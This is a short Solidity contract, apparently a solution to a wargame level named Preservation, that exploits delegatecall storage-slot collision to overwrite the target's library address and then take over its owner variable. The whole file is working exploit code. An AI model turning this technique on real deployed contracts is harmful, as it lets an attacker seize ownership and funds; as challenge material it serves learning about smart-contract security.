pragma solidity ^0.4.23;

import "./levels/Preservation.sol";

contract PreservationHack {
    // NOTE:
    // placeholder slots for timeZoneLibraries are needed so that
    // modifying the owner variable corresponds to the third slot
    address public timeZone1LibrarySlot;
    address public timeZone2LibrarySlot;
    address public owner; 
    
    function attack(address _target) public {
        Preservation target = Preservation(_target);
        // overwrite timeZone1Library with Hack contract address
        target.setFirstTime(uint256(address(this)));
        // change owner to transaction origin
        target.setFirstTime(1);
    }
    
    function setTime(uint _time) public {
        _time;
        owner = tx.origin;
    }
}

